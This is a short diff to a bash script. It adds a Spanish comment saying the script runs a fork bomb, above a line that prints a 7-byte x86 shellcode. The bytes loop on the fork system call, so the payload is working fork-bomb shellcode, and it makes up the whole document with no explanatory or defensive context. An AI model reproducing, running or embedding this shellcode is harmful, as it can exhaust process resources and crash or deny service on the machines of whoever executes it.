@@ -1,5 +1,6 @@
 #!/bin/bash
 
+#Ejecuta una bomba fork
 #7 bytes
 echo -ne "\x6a\x02\x58\xcd\x80\xeb\xf9"
 
